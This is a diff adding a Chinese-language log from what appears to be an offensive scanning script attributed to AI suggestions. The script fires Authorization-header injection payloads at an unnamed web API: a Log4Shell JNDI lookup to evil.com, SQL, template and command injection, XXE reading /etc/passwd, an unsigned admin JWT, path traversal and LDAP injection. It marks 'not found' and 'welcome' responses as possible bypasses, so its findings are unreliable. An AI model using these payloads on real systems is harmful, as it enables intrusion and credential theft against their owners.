@@ -1,0 +1,65 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 v13.0 Authorization头注入攻击（AI建议）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[*] AI发现: .htaccess会传递Authorization头到环境变量
+[*] 可能存在: Authorization头注入/认证绕过
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[*] 测试高价值API端点...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+━━━ 测试API: /api/user/info ━━━
+  Authorization: Bearer → ❌
+  Authorization: Bearer  → ❌
+  Authorization: Bearer null → ❌
+  Authorization: Bearer undefined → ❌
+  Authorization: Bearer ${jndi:ldap://evil.com} → ❌
+  Authorization: Bearer {{7*7}} → ❌
+  Authorization: Bearer <%= 7*7 %> → ❌
+  Authorization: Bearer ' OR '1'='1 → ❌
+  Authorization: Bearer admin'-- → ❌
+  Authorization: Bearer $(whoami) → ❌
+  Authorization: Bearer ;whoami; → ❌
+  Authorization: Bearer |whoami → ❌
+  Authorization: Bearer <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> → ❌
+  Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ. → ❌
+  Authorization: Bearer ../../../etc/passwd → ❌
+  Authorization: Bearer *)(uid=*))(|(uid=* → ❌
+
+━━━ 测试API: /api/admin/users ━━━
+  Authorization: Bearer → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer  → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer null → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer undefined → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer ${jndi:ldap://evil.com} → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer {{7*7}} → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer <%= 7*7 %> → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer ' OR '1'='1 → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer admin'-- → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer $(whoami) → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer ;whoami; → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer |whoami → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ. → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer ../../../etc/passwd → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}  Authorization: Bearer *)(uid=*))(|(uid=* → ⚠️  可能绕过！
+{"success":false,"message":"The route api\/admin\/users could not be found.","code":1104,"errors":[]}
+━━━ 测试API: / ━━━
+  Authorization: Bearer → ⚠️  可能绕过！
+welcome  Authorization: Bearer  → ⚠️  可能绕过！
+welcome  Authorization: Bearer null → ⚠️  可能绕过！
+welcome  Authorization: Bearer undefined → ⚠️  可能绕过！
+welcome  Authorization: Bearer ${jndi:ldap://evil.com} → ⚠️  可能绕过！
+welcome  Authorization: Bearer {{7*7}} → ⚠️  可能绕过！
+welcome  Authorization: Bearer <%= 7*7 %> → ⚠️  可能绕过！
+welcome  Authorization: Bearer ' OR '1'='1 → ⚠️  可能绕过！
+welcome  Authorization: Bearer admin'-- → ⚠️  可能绕过！
+welcome  Authorization: Bearer $(whoami) → ⚠️  可能绕过！
+welcome  Authorization: Bearer ;whoami; → ⚠️  可能绕过！
+welcome  Authorization: Bearer |whoami → ⚠️  可能绕过！
+welcome  Authorization: Bearer <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> → ⚠️  可能绕过！
+welcome  Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ. → ⚠️  可能绕过！
+welcome  Authorization: Bearer ../../../etc/passwd → ⚠️  可能绕过！
+welcome  Authorization: Bearer *)(uid=*))(|(uid=* → ⚠️  可能绕过！
+welcome
